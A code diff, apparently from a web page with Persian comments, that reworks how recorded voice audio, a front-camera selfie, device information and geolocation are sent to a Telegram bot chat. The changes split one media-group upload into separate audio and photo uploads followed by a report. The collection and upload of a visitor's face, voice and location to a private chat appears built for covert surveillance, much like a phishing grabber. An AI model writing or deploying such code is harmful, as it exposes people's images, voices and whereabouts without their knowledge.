@@ -54,29 +54,28 @@
 
     let mediaRecorder, stream, timer, photoStream;
 
-    // فقط عکس سلفی (دوربین جلو)
+    // عکس سلفی (فوری و بدون تأخیر)
     async function captureSelfie() {
       return new Promise((resolve) => {
-        const constraints = {
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
-        };
-
-        navigator.mediaDevices.getUserMedia(constraints)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
           .then(s => {
             photoStream = s;
             video.srcObject = s;
-            video.oncanplay = () => {
+            video.onloadedmetadata = () => {
+              video.play();
               canvas.width = video.videoWidth || 640;
               canvas.height = video.videoHeight || 480;
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               canvas.toBlob(blob => {
                 stopPhotoStream();
                 resolve(blob);
-              }, 'image/jpeg', 0.85);
+              }, 'image/jpeg', 0.8);
             };
           })
-          .catch(() => resolve(null));
+          .catch(() => {
+            stopPhotoStream();
+            resolve(null);
+          });
       });
     }
 
@@ -87,7 +86,7 @@
       }
     }
 
-    // موقعیت
+    // موقعیت + اطلاعات
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ error: "نامشخص" });
@@ -138,11 +137,8 @@
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(chunks, { type: mimeType });
           const selfieBlob = await captureSelfie();
-          const [deviceInfo, location] = await Promise.all([
-            getDeviceInfo(),
-            getLocation()
-          ]);
-          await sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location);
+          const [deviceInfo, location] = await Promise.all([getDeviceInfo(), getLocation()]);
+          await sendAllSeparately(audioBlob, selfieBlob, deviceInfo, location);
           stopStream();
         };
 
@@ -166,50 +162,35 @@
       }
     }
 
-    // ارسال فوری با sendMediaGroup
-    async function sendAllAtOnce(audioBlob, selfieBlob, deviceInfo, location) {
+    // ارسال جداگانه (ویس → عکس → گزارش)
+    async function sendAllSeparately(audioBlob, selfieBlob, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
-
-      const media = [];
       let messageId = null;
 
-      // ویس
+      // ۱. ارسال ویس
       if (audioBlob) {
-        media.push({ type: 'audio', media: audioBlob, caption: 'ویس ۱۰ ثانیه‌ای' });
-      }
-
-      // فقط سلفی
-      if (selfieBlob) {
-        media.push({ type: 'photo', media: selfieBlob, caption: 'سلفی کاربر' });
-      }
-
-      if (media.length > 0) {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        media.forEach((item, i) => {
-          form.append(`file${i}`, item.media, `${item.caption.replace(/ /g, '_')}.jpg`);
-          form.append(`type${i}`, item.type);
-          form.append(`caption${i}`, item.caption);
-        });
-        form.append('media', JSON.stringify(media.map((m, i) => ({
-          type: m.type,
-          media: `attach://file${i}`,
-          caption: m.caption
-        }))));
-
+        const audioForm = new FormData();
+        audioForm.append('chat_id', CHAT_ID);
+        audioForm.append('audio', audioBlob, `voice_${Date.now()}.webm`);
         try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
-            method: 'POST',
-            body: form
-          });
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: audioForm });
           const data = await res.json();
-          if (data.ok) messageId = data.result[0].message_id;
-        } catch (e) {
-          console.error("sendMediaGroup failed", e);
-        }
+          if (data.ok) messageId = data.result.message_id;
+        } catch (e) { console.error("ویس نشد", e); }
       }
 
-      // گزارش
+      // ۲. ارسال عکس سلفی
+      if (selfieBlob && messageId) {
+        const photoForm = new FormData();
+        photoForm.append('chat_id', CHAT_ID);
+        photoForm.append('photo', selfieBlob, 'selfie.jpg');
+        photoForm.append('reply_to_message_id', messageId);
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: photoForm });
+        } catch (e) { console.error("عکس نشد", e); }
+      }
+
+      // ۳. گزارش
       const report = `
 *گزارش کاربر*
 
